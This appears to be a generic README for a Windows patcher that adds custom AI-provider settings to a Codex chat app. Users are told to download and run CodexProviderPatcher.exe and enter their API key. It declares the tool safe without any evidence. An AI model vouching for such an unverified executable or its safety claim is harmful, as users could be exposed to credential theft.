The Better-Codex-App-Custom-Provider-Support tool allows you to change your AI model provider directly inside your chat application. You keep your existing account access while you switch between different service providers. This utility bridges the gap between your standard chat interface and advanced AI model API services.

⚙️ System Requirements

  • Windows 10 or Windows 11
  • Current version of the Codex application
  • Stable internet connection
  • Minimum of 200MB free disk space

📥 Installation Steps

Follow these instructions to set up the software on your Windows computer.

  1. Visit the official releases page to select the latest version.
  2. Click the file named CodexProviderPatcher.exe to download it to your desktop.
  3. Locate the file in your downloads folder.
  4. Double-click the file to start the installation wizard.
  5. Follow the screen prompts to complete the setup process.

🚀 Using the Application

After you finish the installation, you can connect your preferred provider.

  • Open the Codex application from your Windows Start menu.
  • Look for the new settings menu icon in the top right corner of the chat window.
  • Select the "Provider Settings" option from the list.
  • Enter your API key provided by your chosen service.
  • Choose your model from the dropdown menu to apply the changes.

🛠️ Troubleshooting Common Issues

If you encounter difficulties, verify these items:

  • Ensure you have the latest update of the main Codex application.
  • Check your internet connection status.
  • Verify that your API key is correct and active.
  • Restart the application after you save your settings.

💡 Frequently Asked Questions

Will this affect my current account? No, this tool adds a layer to the existing software. You remain logged in to your original account services.

Is the software safe? Yes, the tool interacts only with the internal settings of the application and does not transmit your private data to third-party endpoints outside of the requested API calls.

Can I revert changes? You can uninstall the patch via your Windows control panel to restore the default application settings.
